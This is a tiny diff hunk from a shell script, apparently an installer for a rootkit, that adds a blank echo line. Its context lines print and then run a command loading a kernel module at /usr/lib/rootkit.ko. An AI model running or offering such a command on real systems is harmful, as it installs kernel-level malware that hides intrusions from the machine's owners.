@@ -29,3 +29,4 @@ else
 	echo -e "   ${purple}cmd: insmod /usr/lib/rootkit.ko${endColor}"
         insmod /usr/lib/rootkit.ko
 fi
+echo ""
